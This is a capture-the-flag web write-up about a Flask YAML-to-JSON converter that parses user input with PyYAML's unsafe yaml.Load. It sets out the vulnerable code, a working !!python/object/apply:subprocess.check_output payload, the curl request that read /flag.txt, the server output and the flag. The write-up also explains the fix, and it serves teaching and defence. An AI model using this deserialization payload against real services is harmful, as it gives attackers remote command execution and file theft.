# YAML Ain't Safe

## Metadata

| Field | Value |
| --- | --- |
| Category | `web` |
| Difficulty | Easy |
| Points | 100 |
| Solves | 194 |
| First Blood | olati |

## Challenge Description

```text
A developer built an online YAML-to-JSON converter and proudly open-sourced it.

The flag is /flag.txt.
```

## Artifacts

The provided archive contained a single Flask application:

```text
public.zip
app.py
solve_yaml.sh
```

The archive password from the challenge notes was:

```text
infected
```

Target used during the solve:

```text
https://5d023d5116435344.chal.ctf.ae
```

## Recon

I started by checking what was inside the provided archive instead of assuming
the bug from the challenge title:

```bash
7z l -pinfected public.zip
```

Relevant output:

```text
Listing archive: public.zip
Name
------------------------
app.py
```

The source was small enough to map manually. `app.py` exposed three routes:

```text
GET  /
GET  /health
POST /convert
```

The only route that accepted user input was `/convert`:

```python
@app.route("/convert", methods=["POST"])
def convert():
    data = request.get_json()
    if not data or "yaml_input" not in data:
        return jsonify({"error": "Missing yaml_input field"}), 400

    yaml_input = data["yaml_input"]
```

Before trying anything dangerous, I confirmed the intended behavior with normal
YAML. This also gave the exact JSON request shape expected by the service:

```bash
curl -k -i -X POST \
  https://5d023d5116435344.chal.ctf.ae/convert \
  -H 'Content-Type: application/json' \
  --data '{"yaml_input":"name: demo\nitems:\n  - one\n  - two"}'
```

Representative response:

```json
{
  "result": "{\n  \"name\": \"demo\",\n  \"items\": [\n    \"one\",\n    \"two\"\n  ]\n}"
}
```

So the useful attack surface was the YAML parser reached through
`POST /convert`, not routing, authentication, or file upload behavior.

## Vulnerability

The vulnerable line is in `app.py`, line 31:

```python
parsed = yaml.load(yaml_input, Loader=yaml.Loader)
```

The reason this stood out is that the service parses attacker-controlled YAML
with PyYAML's full `yaml.Loader`. I then checked the PyYAML documentation to
confirm the suspicion: `yaml.load` is not safe for untrusted input, can construct
Python objects, and `safe_load` is the intended restricted alternative.

The rest of the route explains why this becomes data exfiltration, not only code
execution:

```python
json_output = json.dumps(parsed, indent=2, default=str)
return jsonify({"result": json_output})
```

Because `json.dumps(..., default=str)` converts otherwise non-JSON values to
strings, a payload that returns bytes can survive into the HTTP response. That is
why I used `subprocess.check_output` instead of `os.system`: `os.system` would
only return an exit code, while `check_output` returns command output.

The local proof used a harmless command:

```bash
python3 -c 'import yaml; print(yaml.load("!!python/object/apply:subprocess.check_output [[\"printf\", \"YAML_RCE\"]]", Loader=yaml.Loader))'
```

Output:

```text
b'YAML_RCE'
```

That proved the parser could invoke a Python callable during YAML loading and
return its output as the parsed value.

## Exploitation

The exploit chain was:

1. Identify `/convert` as the only user-controlled route.
2. Confirm normal YAML conversion and the required JSON body: `yaml_input`.
3. Notice `yaml.load(yaml_input, Loader=yaml.Loader)` in the source.
4. Verify locally that a `!!python/object/apply` tag can call
   `subprocess.check_output`.
5. Replace the harmless command with `cat /flag.txt`, which the challenge
   description said was the flag path.
6. Send the payload to the remote `/convert` endpoint and read the command output
   from the `result` field.

The final YAML payload was:

```yaml
!!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
```

The final HTTP request was:

```bash
curl -k -i -X POST \
  https://5d023d5116435344.chal.ctf.ae/convert \
  -H 'Content-Type: application/json' \
  --data '{"yaml_input":"!!python/object/apply:subprocess.check_output [[\"cat\", \"/flag.txt\"]]"}'
```

The server returned:

```json
{"result":"\"b'flag{d5ed98110d04e821}\\\\n'\""}
```

## Technical Details

PyYAML has different loaders. A safe YAML-to-JSON converter should only parse
simple data types such as mappings, lists, strings, numbers, and booleans. In
PyYAML that means using `yaml.safe_load` or `SafeLoader` for untrusted input.

This application used `yaml.Loader`, which supports Python-specific YAML tags.
The `!!python/object/apply` tag constructs a value by calling a Python callable.
In this case, the callable was:

```text
subprocess.check_output
```

and the argument list was:

```text
[["cat", "/flag.txt"]]
```

At parse time, PyYAML evaluated the tag, called `subprocess.check_output`, and
the parsed value became the bytes returned by `cat /flag.txt`. The Flask route
then serialized that bytes object with `default=str`, producing the visible
string representation:

```text
b'flag{d5ed98110d04e821}\n'
```

So the vulnerable data flow was:

```text
JSON yaml_input
  -> yaml.load(..., Loader=yaml.Loader)
  -> !!python/object/apply calls subprocess.check_output
  -> bytes output becomes parsed value
  -> json.dumps(..., default=str)
  -> HTTP JSON response leaks /flag.txt
```

## Exploit Artifact

The final artifact is [solve_yaml.sh](solve_yaml.sh). It posts the
`!!python/object/apply` payload to `/convert`.

Usage:

```bash
chmod +x solve_yaml.sh
./solve_yaml.sh https://5d023d5116435344.chal.ctf.ae
```

## Validation

Health check:

```text
HTTP/1.1 200 OK
OK
```

Benign conversion proof:

```json
{
  "result": "{\n  \"name\": \"demo\",\n  \"items\": [\n    \"one\",\n    \"two\"\n  ]\n}"
}
```

Exploit response:

```json
{"result":"\"b'flag{d5ed98110d04e821}\\\\n'\""}
```

## References

- <https://pyyaml.org/wiki/PyYAMLDocumentation>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>

## Flag

```text
flag{d5ed98110d04e821}
```
